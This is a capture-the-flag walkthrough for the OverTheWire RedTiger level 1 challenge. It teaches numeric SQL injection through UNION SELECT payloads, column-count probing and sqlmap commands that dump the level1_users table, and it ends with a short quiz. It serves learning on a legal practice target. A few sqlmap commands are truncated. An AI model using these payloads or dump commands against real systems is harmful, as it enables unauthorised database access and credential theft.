Find and exploit a SQL Injection vulnerability in the cat parameter. Extract the username and password of user Hornoxe from the table level1_users.

level1.php?cat=1

cat (numeric)

Background — What is SQL Injection?

A web application uses SQL queries to get data from a database. When user input is placed directly inside a query without validation, an attacker can change the meaning of that query.

Normal query (safe):

SQL 
SELECT * FROM articles WHERE cat = 1

After injection (dangerous):

SQL 
SELECT * FROM articles WHERE cat = 0
UNION SELECT 1,2,username,password FROM level1_users
ℹ Because the parameter is numeric, we do not need quotes around our input. This is called a numeric SQL injection.
Step-by-Step Walkthrough
01

Open the Target Page

Open your browser and go to the target URL. You will see a simple page that shows articles by category.

URL 
https://redtiger.labs.overthewire.org/level1.php?cat=1
ℹ Notice the URL: cat=1. This number controls which category is shown. We will try to change what the database returns by modifying this value.
02

Confirm the Vulnerability

Test whether the parameter reacts to SQL logic. Try these two URLs and compare the results:

URL — Should show content 
https://redtiger.labs.overthewire.org/level1.php?cat=1 AND 1=1
URL — Should show NO content 
https://redtiger.labs.overthewire.org/level1.php?cat=1 AND 1=2
✓ Expected Result
AND 1=1  →  page shows article content  (true condition)
AND 1=2  →  page is empty or shows nothing  (false condition)

If the page behaves differently → the parameter IS vulnerable!
03

Find the Number of Columns

Before using UNION SELECT, we must know how many columns the original query returns. Use ORDER BY and increase the number until the page breaks.

URL — Test column count 
https://redtiger.labs.overthewire.org/level1.php?cat=1 ORDER BY 4--
https://redtiger.labs.overthewire.org/level1.php?cat=1 ORDER BY 5--
✓ Expected Result
ORDER BY 4  →  page works normally
ORDER BY 5  →  error or empty page

Conclusion: the query has exactly 4 columns.
⚠ The -- at the end is a SQL comment. It tells the database to ignore everything after our injection. Some servers need -- - (with a space) or # instead.
04

Find Which Columns Are Visible

Now we use UNION SELECT with 4 values and see which ones appear on the page. We use cat=0 so the original query returns no rows — only our injected data shows.

URL 
https://redtiger.labs.overthewire.org/level1.php?cat=0 UNION SELECT 1,2,3,4--
✓ Expected Result
Numbers appear in the page content, for example:  3  and  4

This means columns 3 and 4 are displayed → we can use them to extract data.
05

Extract Username and Password

Replace the visible column positions with the column names from the level1_users table. We want username and password.

URL — Extract credentials 
https://redtiger.labs.overthewire.org/level1.php?cat=0
UNION SELECT 1,2,username,password
FROM level1_users--
ℹ If you want only the user Hornoxe, add a WHERE clause:
URL — Filter by username 
https://redtiger.labs.overthewire.org/level1.php?cat=0
UNION SELECT 1,2,username,password
FROM level1_users
WHERE username='Hornoxe'--
⚠ Run SQLMap from Kali Linux or any terminal where sqlmap is installed.

Step A — Detect the vulnerability and list databases:

Terminal 
sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' \
       --dbs \
       --level=3 --risk=2

Step B — List tables inside the database:

Terminal 
sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' \
       -D hackit \
       --tables

Step C — Dump all data from level1_users:

Terminal 
sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' \
       -D hackit \
       -T level1_users \

Full command — All in one (aggressive scan):

Terminal — Full 
sqlmap -u 'https://redtiger.labs.overthewire.org/level1.php?cat=1' \

ℹ SQLMap flag reference:
-u = target URL  |  --dbs = list databases  |  -D = select database  |  -T = select table  |  --dump = extract data  |  --level = test depth (1–5)  |  --risk = risk of tests (1–3)

Password: [the password you found]

Enter these credentials on the level page to proceed to Level 2.

Knowledge Check — Answer the Questions
Q1 Why do we use cat=0 instead of cat=1 in the UNION SELECT payload? ▶

Because cat=0 returns zero rows from the original query. This means only our injected UNION SELECT data appears on the page, making it easy to read the extracted values without mixing them with normal content.

Q2 What does the -- at the end of the URL do? ▶

It is a SQL comment. Everything after -- is ignored by the database. This prevents syntax errors caused by the rest of the original query (e.g., a closing quote or extra conditions).

Q3 Why is this injection called "numeric" and why don't we need an apostrophe (')? ▶

Because the original SQL query compares the cat value as a number: WHERE cat = 1. Numbers are not surrounded by quotes in SQL, so we can inject SQL keywords directly without needing to close a string with '.

Q4 How does ORDER BY help us find the number of columns? ▶

ORDER BY N sorts results by the Nth column. If N is higher than the actual number of columns, the database throws an error. We increase N until we get an error — the last number that worked is the column count.

Q5 What is the difference between manual injection and using SQLMap? ▶

Manual injection requires you to understand and write each SQL payload yourself. SQLMap is an automated tool that detects and exploits SQL injection automatically. Manual is better for learning; SQLMap is faster in real penetration tests but can be noisy and trigger detection systems.
